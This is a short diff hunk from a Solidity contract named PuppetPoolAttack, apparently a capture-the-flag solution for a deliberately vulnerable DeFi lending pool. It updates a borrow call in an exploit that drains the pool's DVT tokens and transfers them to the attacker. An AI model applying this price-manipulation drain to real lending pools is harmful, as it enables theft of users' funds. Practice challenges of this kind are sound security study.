@@ -48,7 +48,7 @@ contract PuppetPoolAttack {
         uint256 maxBorrowAmount = calculateBorrowAmount(address(this).balance);
         uint256 poolDVTBalance = dvt.balanceOf(address(puppetPool));
         uint256 borrowAmount = maxBorrowAmount > poolDVTBalance ? poolDVTBalance : maxBorrowAmount;
-        puppetPool.borrow{value: address(this).balance}(borrowAmount);
+        puppetPool.borrow{value: address(this).balance}(borrowAmount, address(this));
 
         // 3. Send everything to the attacker
         dvt.transfer(attacker, dvt.balanceOf(address(this)));
